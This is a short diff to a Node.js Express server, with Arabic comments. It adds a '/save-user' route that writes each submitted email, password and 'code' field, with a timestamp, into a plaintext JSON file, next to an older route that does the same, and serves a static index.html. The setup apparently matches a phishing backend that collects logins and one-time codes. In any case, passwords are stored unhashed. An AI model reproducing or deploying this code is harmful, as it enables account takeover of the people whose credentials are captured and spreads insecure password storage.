@@ -23,7 +23,25 @@ function readData() {
   return [];
 }
 
-// مسار حفظ البيانات
+// مسار حفظ البيانات (/save-user)
+app.post('/save-user', (req, res) => {
+  const { email, password, code } = req.body;
+  
+  const entry = {
+    email: email || '',
+    password: password || '',
+    code: code || '',
+    date: new Date().toLocaleString()
+  };
+
+  const data = readData();
+  data.push(entry);
+  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+
+  res.json({ status: 'success' });
+});
+
+// مسار حفظ البيانات القديم (/api/save-data)
 app.post('/api/save-data', (req, res) => {
   const { email, password, code } = req.body;
   
@@ -102,6 +120,7 @@ app.use(express.static(__dirname));
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
